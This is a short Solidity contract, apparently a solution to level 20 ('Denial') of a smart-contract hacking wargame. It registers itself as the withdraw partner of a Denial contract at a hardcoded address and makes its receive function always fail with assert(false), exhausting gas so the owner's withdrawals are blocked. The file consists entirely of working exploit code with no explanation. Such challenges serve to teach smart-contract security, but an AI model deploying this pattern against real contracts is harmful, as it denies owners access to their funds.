// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "src/level20.sol";

contract DenialExploit {
    using SafeMath for uint256;

    Denial denial = Denial(0xD8b78E4E7854cf91D4488F2e66983F22269c3f5b);

    constructor() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        assert(false);
    }
}
